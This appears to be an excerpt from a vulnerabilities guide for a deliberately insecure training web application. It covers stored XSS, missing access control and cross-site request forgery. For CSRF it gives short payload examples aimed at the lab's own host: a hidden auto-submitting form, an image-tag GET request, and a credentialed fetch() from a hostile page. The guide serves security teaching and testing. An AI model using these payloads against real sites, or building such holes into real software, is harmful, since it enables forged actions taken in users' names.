# 🛡️ Vulnerable Web Application - Vulnerabilities Guide

## 📋 Overview

This document details all intentional vulnerabilities in the web application for educational and testing purposes.
...
### Description
User-supplied content stored in database and rendered without sanitization or escaping.
...
<form action="http://vulnerable-app.com/posts" method="POST">
    <input type="hidden" name="content" value="I was hacked!">
...
#### 2. Image Tag Trick (if method is GET)
```html
<img src="http://vulnerable-app.com/posts?content=hacked">
```

#### 3. Fetch Request from Malicious Site
```html
<script>
fetch('http://vulnerable-app.com/posts', {
    method: 'POST',
    credentials: 'include',
...
### Description
Access control checks missing, allowing users to access/modify other users' data by changing object reference.
